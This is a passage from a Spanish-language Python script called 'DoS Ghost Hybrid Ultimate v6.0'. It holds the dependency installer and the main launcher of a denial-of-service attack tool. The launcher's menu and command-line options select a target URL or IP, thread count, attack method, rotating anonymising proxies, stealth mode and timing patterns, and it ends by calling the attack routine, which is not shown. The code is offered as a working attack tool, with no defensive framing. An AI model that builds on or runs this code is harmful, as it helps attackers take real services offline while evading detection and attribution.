           subprocess.run([
               sys.executable, '-m', 'pip', 'install'
           ] + dependencies, check=True, capture_output=True)
           
           print(f"{Colors.GREEN}[+] Dependencias instaladas correctamente{Colors.ENDC}")
           
           # Verificar instalación
           import aiohttp
           import psutil
           import socks
           
       except subprocess.CalledProcessError:
           print(f"{Colors.RED}[!] Error al instalar dependencias{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] Instala manualmente: pip install aiohttp psutil requests pysocks{Colors.ENDC}")
           sys.exit(1)
       except ImportError:
           print(f"{Colors.RED}[!] Error al importar dependencias después de instalar{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] Reinicia el script después de instalar: pip install aiohttp psutil requests pysocks{Colors.ENDC}")
           sys.exit(1)

# ==================== FUNCIÓN PRINCIPAL HÍBRIDA ====================

async def main_hybrid():
   """Función principal híbrida"""
   # Cargar configuración
   config = load_config()
   
   # Detectar recursos del sistema
   system_info = detect_system_resources()
   
   # Configurar argumentos
   parser = argparse.ArgumentParser(description="DoS Ghost Hybrid Ultimate v6.0")
   parser.add_argument("-t", "--target", help="URL o IP objetivo")
   parser.add_argument("-p", "--port", type=int, help="Puerto objetivo (solo para IPs)")
   parser.add_argument("-th", "--threads", type=int, default=config['default_threads'],
                      help=f"Número de hilos (recomendado: {system_info['recommended_threads']})")
   parser.add_argument("-m", "--method", choices=list(ATTACK_METHODS.keys()), 
                      default=config['default_method'], help="Método de ataque")
   parser.add_argument("-a", "--anonymous", action="store_true", help="Usar modo anónimo con proxies")
   parser.add_argument("-pf", "--proxy-file", help="Archivo con lista de proxies")
   parser.add_argument("-v", "--verify-proxies", action="store_true", help="Verificar proxies antes de usar")
   parser.add_argument("-tp", "--timing-pattern", choices=list(TIMING_PATTERNS.keys()), 
                      default=config['timing_pattern'], help="Patrón de timing")
   parser.add_argument("-s", "--stealth", action="store_true", help="Activar modo sigiloso")
   parser.add_argument("-rf", "--rotation-freq", type=int, default=config['proxy_rotation_freq'],
                      help="Frecuencia de rotación de proxies")

   args = parser.parse_args()

   # Si no hay argumentos, mostrar menú interactivo
   if not args.target:
       show_hybrid_banner()
       
       while True:
           print(f"\n{Colors.BOLD}{Colors.WHITE}════════════════ MENÚ PRINCIPAL HÍBRIDO ════════════════{Colors.ENDC}")
           print(f"{Colors.GREEN}[1] Iniciar ataque híbrido{Colors.ENDC}")
           print(f"{Colors.BLUE}[2] Configuración avanzada{Colors.ENDC}")
           print(f"{Colors.CYAN}[3] Ver métodos disponibles{Colors.ENDC}")
           print(f"{Colors.YELLOW}[4] Ver reportes anteriores{Colors.ENDC}")
           print(f"{Colors.PURPLE}[5] Verificar proxies{Colors.ENDC}")
           print(f"{Colors.RED}[6] Salir{Colors.ENDC}")
           print(f"{Colors.WHITE}═════════════════════════════════════════════════════════{Colors.ENDC}")

           choice = input(f"\n{Colors.BLUE}[?] Selecciona una opción: {Colors.ENDC}")

           if choice == '1':
               break
           elif choice == '2':
               show_config_menu()
               show_hybrid_banner()
           elif choice == '3':
               show_methods_menu()
               input("Presiona Enter para continuar...")
               clear_screen()
               show_hybrid_banner()
           elif choice == '4':
               show_reports()
               input("Presiona Enter para continuar...")
               clear_screen()
               show_hybrid_banner()
           elif choice == '5':
               proxy_file = input(f"{Colors.BLUE}[?] Archivo de proxies (Enter para automático): {Colors.ENDC}")
               if proxy_file:
                   proxy_list_temp = load_proxies_from_file(proxy_file)
               else:
                   print(f"{Colors.BLUE}[*] Obteniendo proxies automáticamente...{Colors.ENDC}")
                   proxy_list_temp = get_free_proxies()

               if proxy_list_temp:
                   verified = verify_and_score_proxies(proxy_list_temp)
                   print(f"{Colors.GREEN}[+] {len(verified)} proxies verificados de {len(proxy_list_temp)} totales{Colors.ENDC}")

               input("Presiona Enter para continuar...")
               clear_screen()
               show_hybrid_banner()
           elif choice == '6':
               print(f"{Colors.GREEN}[*] ¡Hasta luego!{Colors.ENDC}")
               sys.exit(0)
           else:
               print(f"{Colors.RED}[!] Opción inválida{Colors.ENDC}")

   # Solicitar información del objetivo si no se proporcionó
   if not args.target:
       target_input = input(f"{Colors.BLUE}[?] Ingresa la URL o IP objetivo: {Colors.ENDC}")
       if not target_input:
           print(f"{Colors.RED}[!] Objetivo requerido{Colors.ENDC}")
           return
       args.target = target_input

   # Validar objetivo
   target_info = validate_target(args.target)
   if not target_info:
       print(f"{Colors.RED}[!] Error: Objetivo inválido{Colors.ENDC}")
       return

   # Manejar puerto manual para IPs
   if target_info['type'] == 'ip' and args.port:
       target_info['port'] = args.port
       target_info['full_url'] = f"http://{target_info['host']}:{args.port}"

   # Configurar threads
   threads = args.threads
   if threads <= 0 or threads > 100:
       threads = system_info['recommended_threads']
       print(f"{Colors.YELLOW}[!] Threads ajustados a valor recomendado: {threads}{Colors.ENDC}")

   # Configurar método
   method = args.method
   timing_pattern = args.timing_pattern
   stealth_mode = args.stealth or config['stealth_mode']
   rotation_freq = args.rotation_freq

   # Configuración de anonimato
   use_proxy = False
   if args.anonymous or args.proxy_file:
       if args.proxy_file:
           use_proxy = setup_proxy_environment(
               proxy_file=args.proxy_file,
               verify_proxies=args.verify_proxies
           )
       else:
           use_proxy = setup_proxy_environment(
               auto_proxy=True, 
               verify_proxies=args.verify_proxies
           )

   # Solicitar configuración de proxies si no se especificó
   if not args.anonymous and not args.proxy_file:
       anonymous_input = input(f"{Colors.BLUE}[?] ¿Usar modo anónimo con proxies? (s/n): {Colors.ENDC}").lower()
       if anonymous_input == 's':
           use_proxy_file = input(f"{Colors.BLUE}[?] ¿Tienes un archivo de proxies? (s/n): {Colors.ENDC}").lower()
           verify_input = input(f"{Colors.BLUE}[?] ¿Verificar proxies antes de usar? (s/n): {Colors.ENDC}").lower()
           verify_proxies = verify_input == 's'

           if use_proxy_file == 's':
               proxy_file = input(f"{Colors.BLUE}[?] Ruta al archivo de proxies: {Colors.ENDC}")
               use_proxy = setup_proxy_environment(
                   proxy_file=proxy_file, 
                   verify_proxies=verify_proxies
               )
           else:
               use_proxy = setup_proxy_environment(
                   auto_proxy=True, 
                   verify_proxies=verify_proxies
               )

   # Mostrar configuración del ataque
   print(f"\n{Colors.YELLOW}[*] Configuración del ataque híbrido:{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Objetivo: {Colors.BOLD}{target_info['host']}:{target_info['port']}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Tipo: {Colors.BOLD}{target_info['type'].upper()}{Colors.ENDC}")
   if target_info['type'] == 'url':
       print(f"{Colors.GREEN}[+] Esquema: {Colors.BOLD}{target_info['scheme']}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Método: {Colors.BOLD}{method} - {ATTACK_METHODS[method]}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Hilos: {Colors.BOLD}{threads}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Patrón de timing: {Colors.BOLD}{timing_pattern}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Modo sigiloso: {Colors.BOLD}{('Activado' if stealth_mode else 'Desactivado')}{Colors.ENDC}")
   print(f"{Colors.GREEN}[+] Modo anónimo: {Colors.BOLD}{('Activado' if use_proxy else 'Desactivado')}{Colors.ENDC}")
   
   if use_proxy:
       print(f"{Colors.GREEN}[+] Proxies disponibles: {Colors.BOLD}{len(proxy_list)}{Colors.ENDC}")
       print(f"{Colors.GREEN}[+] Frecuencia de rotación: {Colors.BOLD}cada {rotation_freq} paquetes{Colors.ENDC}")
   
   print(f"{Colors.GREEN}[+] Versión: {Colors.BOLD}Ghost Hybrid Ultimate v6.0{Colors.ENDC}")

   # Confirmación final
   confirm = input(f"\n{Colors.YELLOW}[?] ¿Iniciar ataque híbrido? (s/n): {Colors.ENDC}").lower()
   if confirm != 's':
       print(f"{Colors.RED}[!] Ataque cancelado{Colors.ENDC}")
       return

   print(f"\n{Colors.GREEN}[*] Iniciando ataque híbrido con configuración completa...{Colors.ENDC}")
   
   # Iniciar ataque híbrido
   await start_hybrid_attack(
       target_info,
       threads,
       method,
       use_proxy,
       timing_pattern,
       stealth_mode,
       rotation_freq
   )

def main():
   """Función principal que maneja la inicialización"""
   try:
       # Banner inicial
       show_hybrid_banner()
       
       # Instalar dependencias automáticamente
       install_dependencies()
       
       # Ejecutar función principal híbrida
       asyncio.run(main_hybrid())
       
   except KeyboardInterrupt:
       print(f"\n{Colors.RED}[!] Programa terminado por el usuario{Colors.ENDC}")
       sys.exit(0)
   except Exception as e:
       print(f"{Colors.RED}[!] Error fatal: {str(e)}{Colors.ENDC}")
       sys.exit(1)

if __name__ == "__main__":
   main()
